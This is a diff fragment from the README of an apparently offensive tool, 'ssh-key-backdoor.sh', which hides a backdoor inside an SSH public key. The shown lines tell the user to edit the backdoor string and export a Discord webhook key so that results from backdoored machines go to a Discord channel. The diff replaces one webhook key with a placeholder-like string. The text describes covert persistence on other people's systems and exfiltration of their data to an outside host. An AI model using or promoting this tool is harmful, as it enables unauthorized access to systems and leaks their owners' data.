@@ -20,7 +20,7 @@ Think of the ssh public key as a sort of `~/.bashrc` but with your backdoor insi
 Create your own **backdoor-string** by editing `ssh-key-backdoor.sh` (between `---BEGIN BACKDOOR---` and `---END BACKDOOR---`) and execute:
 ```console
 # Set your own discord key or the results will be reported to our Discord channel. Please.
-$ export KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+$ export KEY="1246565073951234567/mEDRabcdefghijklnopqrstuvwxzyABCDEahagasdKr7YQmA0Ej1-Ibdaytta_XGGq-n"
 $ ./ssh-key-backdoor.sh
 
 # Or view the clear commands without hex-encoding
